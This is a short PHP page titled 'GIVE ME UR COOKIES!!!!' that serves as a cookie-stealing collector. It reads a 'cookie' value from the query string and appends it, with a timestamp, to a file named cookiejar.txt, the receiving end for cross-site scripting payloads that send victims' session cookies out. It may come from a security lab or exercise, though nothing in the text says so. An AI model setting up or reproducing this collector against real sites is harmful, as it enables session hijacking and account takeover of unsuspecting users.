<?php
        require_once 'header.php';
        file_put_contents('cookiejar.txt', date('c') . " - " . $_GET['cookie'] . "\n", FILE_APPEND);
    ?>
    
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIVE ME UR COOKIES!!!!</title>
</head>
<body>
    
</body>
</html>